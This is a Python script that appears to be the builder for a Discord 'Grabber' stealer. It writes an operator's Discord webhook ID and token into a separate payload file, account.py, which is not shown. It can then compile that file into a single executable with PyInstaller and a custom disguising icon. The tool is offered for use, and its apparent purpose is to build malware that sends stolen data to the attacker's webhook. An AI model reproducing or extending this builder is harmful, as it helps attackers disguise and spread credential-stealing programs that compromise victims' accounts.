import re
import os
import shutil
import subprocess
from tkinter import Tk, filedialog
import time

def print_1():
    text = r"""
  ________            ___.  ___.                 
 /  _____/___________ \_ |__\_ |__   ___________ 
/   \  __\_  __ \__  \ | __ \| __ \_/ __ \_  __ \
\    \_\  \  | \// __ \| \_\ \ \_\ \  ___/|  | \/
 \______  /__|  (____  /___  /___  /\___  >__|   
        \/           \/    \/    \/     \/        
                                                                                                
                                                                                                 
                                 https://discord.gg/Y4ajgYVNCp                                                                  
                                                                                                 
    """
    print(text)

print_1()
webhook_url = input("Enter your Discord webhook URL: ").strip()

match = re.match(r'https://(?:canary\.|ptb\.)?discord(?:app)?\.com/api/webhooks/(\d+)/([\w-]+)', webhook_url)

if not match:
    print("Invalid Discord webhook URL!")
    input("Press Enter to exit...")
    exit()

webhook_id = match.group(1)
webhook_token = match.group(2)

try:
    with open("account.py", "r") as f:
        content = f.read()
except FileNotFoundError:
    print("not found!")
    input("Press Enter to exit...")
    exit()

content = re.sub(r'webhook_id\s*=\s*".*?"', f'webhook_id = "{webhook_id}"', content)
content = re.sub(r'webhook_token\s*=\s*".*?"', f'webhook_token = "{webhook_token}"', content)

with open("account.py", "w") as f:
    f.write(content)

print("updated successfully.")

choice = input("Do you want to make it exe? (yes to confirm): ").strip().lower()
if choice in ["yes", "y"]:
    add_icon = input("Do you want to add icon? (yes to confirm): ").strip().lower()
    icon_path = None

    if add_icon in ["yes", "y"]:
        root = Tk()
        root.withdraw()
        icon_path = filedialog.askopenfilename(
            title="Select icon file (.ico, .png, .jpg)",
            filetypes=[("Icon files", "*.ico *.png *.jpg")]
        )
        root.destroy()

    print("Converting account.py to exe...")

    command = ["pyinstaller", "--onefile", "account.py"]
    if icon_path:
        command.extend(["--icon", icon_path])
    
    subprocess.call(command)

    try:
        os.remove("account.spec")
        shutil.rmtree("build")
    except:
        pass

    print("EXE created and cleanup done.")

    try:
        with open("account.py", "r") as f:
            content = f.read()

        content = re.sub(r'webhook_id\s*=\s*".*?"', 'webhook_id = "id"', content)
        content = re.sub(r'webhook_token\s*=\s*".*?"', 'webhook_token = "token"', content)

        with open("account.py", "w") as f:
            f.write(content)
    except:
        pass

    time.sleep(1)
    subprocess.Popen(f'explorer "{os.path.abspath("dist")}"')

input("Press Enter to exit...")
